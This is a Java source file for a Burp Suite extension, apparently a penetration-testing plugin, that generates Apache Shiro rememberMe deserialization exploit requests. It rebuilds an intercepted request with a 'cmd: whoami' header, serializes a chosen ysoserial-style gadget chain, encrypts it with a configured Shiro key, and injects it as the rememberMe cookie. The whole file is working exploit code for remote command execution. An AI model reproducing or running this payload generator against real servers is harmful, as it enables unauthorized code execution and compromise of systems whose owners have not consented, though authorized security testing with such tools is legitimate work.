package burp;

import org.unicodesec.EncryptUtil;
import yso.payloads.Serializer;
import yso.payloads.exploitType.EXP;
import yso.payloads.gadgets.ObjectGadget;

import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;

public class GeneratePayload {
    /**
     * 对请求包添加cookie rememberMe
     *
     * @param requestResponse 要处理的请求响应对象
     * @return 编码后的请求包
     */
    public static byte[] generatePayload(IHttpRequestResponse requestResponse) throws Exception {
        byte[] request = requestResponse.getRequest();
        IRequestInfo requestInfo = BurpExtender.helpers.analyzeRequest(request);
        int bodyOffset = requestInfo.getBodyOffset();
        int body_length = request.length - bodyOffset;
        String body = new String(request, bodyOffset, body_length, "UTF-8");

        if (request.length - bodyOffset > 10000) {
            return request;
        }

        List<String> headers = BurpExtender.helpers.analyzeRequest(request).getHeaders();
        List<String> newHeaders = new LinkedList<>();
        Iterator<String> iter = headers.iterator();
        while (iter.hasNext()) {
            //不对请求包重复编码
            String header = iter.next();
            if (header.toLowerCase().startsWith("get")) {
                newHeaders.add(header);
            } else if (header.toLowerCase().startsWith("host")) {
                newHeaders.add(header);
            } else if (header.toLowerCase().startsWith("connection")) {
                newHeaders.add(header);
            } else if (header.toLowerCase().startsWith("content-length")) {
                newHeaders.add(header);
            } else if (header.toLowerCase().startsWith("content-type")) {
                newHeaders.add(header);
            }
        }
        newHeaders.add("cmd: whoami");
        final Class<? extends ObjectGadget> payloadClass = ObjectGadget.Utils.getPayloadClass(Config.getpayloadType());
        final Class<? extends EXP> exploitClassClass = EXP.Utils.getPayloadClass(Config.getexploitType());

        final ObjectGadget payload = payloadClass.newInstance();
        final EXP exploitType = exploitClassClass.newInstance();
        final Object object = payload.getObject(exploitType);
        byte[] buf;
        if (!(object instanceof byte[])) {
            // jdk8u20 这个gadget因为比较特殊，返回的byte[]
            buf = Serializer.serialize(object);
        } else {
            buf = (byte[]) object;
        }
        String rememberMe = EncryptUtil.shiroEncrypt(Config.getshiroKey(), buf);
        newHeaders.add(String.format("Cookie: rememberMe=%s", rememberMe));
        return BurpExtender.helpers.buildHttpMessage(newHeaders, body.getBytes());
    }
}
